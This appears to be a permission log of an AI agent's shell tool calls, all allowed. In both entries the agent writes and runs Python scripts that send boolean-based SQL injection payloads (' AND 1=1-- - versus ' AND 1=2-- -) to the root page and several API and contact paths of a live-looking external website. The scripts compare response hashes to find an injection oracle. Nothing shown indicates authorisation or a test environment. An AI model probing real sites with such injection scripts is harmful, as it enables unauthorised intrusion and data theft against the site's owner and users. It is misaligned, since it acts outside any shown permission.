{"ts": 1790725728.1855187, "decision_id": "40fa253713b7", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > tool_outputs/sqli_oracle.py <<'PYEOF'\nimport subprocess, hashlib, time, urllib.parse\nT=\"https://www.infinitycapital.bh\"\ndef fetch(path, tag):\n    url = T + path\n    r = subprocess.run([\"curl\",\"-s\",\"-o\",\"/tmp/o_%s.bin\"%tag,\"-D\",\"/tmp/h_%s.txt\"%tag,\n        \"-w\",\"%{http_code}|%{size_download}|%{time_total}\",\"-H\",\"Cache-Control: no-cache\",\n        \"-H\",\"Pragma: no-cache\", url],capture_output=True,text=True)\n    st=r.stdout.strip()\n    h=open(\"/tmp/h_%s.txt\"%tag,errors=\"ignore\").read()\n    ct=[l.split(\":\",1)[1].strip() for l in h.split(\"\\n\") if l.lower().startswith(\"content-type\")]\n    body=open(\"/tmp/o_%s.bin\"%tag,\"rb\").read()\n    return st, ct[0] if ct else \"\", len(body), hashlib.sha256(body).hexdigest()[:16]\n\ndef compare(base_path, label):\n    print(\"=\"*70)\n    print(\"LABEL:\", label)\n    # baseline\n    b_st,b_ct,b_len,b_h = fetch(base_path+\"?cb=BASE1\",\"b1\")\n    print(f\"  baseline           : {b_st} ct={b_ct} len={b_len} sha={b_h}\")\n    tests = [(\"true\", \"' AND 1=1-- -\"), (\"false\", \"' AND 1=2-- -\")]\n    res={}\n    for nm,p in tests:\n        q = base_path + \"?\" + urllib.parse.urlencode({\"cb\":nm.upper()+\"1\",\"x\":p})\n        st,ct,ln,h = fetch(q,nm)\n        res[nm]=(st,ct,ln,h)\n        print(f\"  {nm:<19}: {st} ct={ct} len={ln} sha={h}  DIFF_FROM_BASE={h!=b_h}\")\n    a,c = res[\"true\"],res[\"false\"]\n    print(f\"  >>> TRUE vs FALSE: identical={a[1:]==c[1:]}\")\n    time.sleep(1)\n\ncompare(\"/\", \"root page param /?page\")\nPYEOF\npython3 tool_outputs/sqli_oracle.py 2>&1 | tee tool_outputs/sqli_oracle.log"}
{"ts": 1790725735.2339935, "decision_id": "2aac843f499b", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && cat > tool_outputs/sqli_oracle2.py <<'PYEOF'\nimport subprocess, hashlib, urllib.parse, time\nT=\"https://www.infinitycapital.bh\"\ndef fetch(url, tag, follow=False):\n    cmd=[\"curl\",\"-s\",\"-o\",\"/tmp/x_%s\"%tag,\"-D\",\"/tmp/xh_%s\"%tag,\"-w\",\"%{http_code}|%{size_download}|%{time_total}|%{url_effective}\"]\n    if follow: cmd.append(\"-L\")\n    cmd += [\"-H\",\"Cache-Control: no-cache\", url]\n    subprocess.run(cmd,capture_output=True,text=True)\n    body=open(\"/tmp/x_%s\"%tag,\"rb\").read()\n    return (open(\"/tmp/xh_%s\"%tag,errors=\"ignore\").read().split(\"\\r\\n\")[0], len(body),\n            hashlib.sha256(body).hexdigest()[:16], body[:100])\n\nfor path in [\"/api/\", \"/api/?id=1\", \"/api/contact\", \"/contact\"]:\n    print(\"=\"*70); print(\"PATH:\", path)\n    for nm,val in [(\"id=1\",\"1\"),(\"id=1true\",\"1' AND 1=1-- -\"),(\"id=1false\",\"1' AND 1=2-- -\")]:\n        u = T+path+(\"&\" if \"?\" in path else \"?\")+urllib.parse.urlencode({\"id\":val}) if path.endswith(\"?id=1\") is False and \"id=\" not in path else T+path\n        st,ln,h,bd = fetch(u, nm.replace(\"=\",\"_\"))\n        print(f\"  {nm:<10}: {st} len={ln} sha={h} body={bd[:90]}\")\n    time.sleep(1)\nPYEOF\npython3 tool_outputs/sqli_oracle2.py 2>&1 | tee tool_outputs/sqli_oracle2.log"}
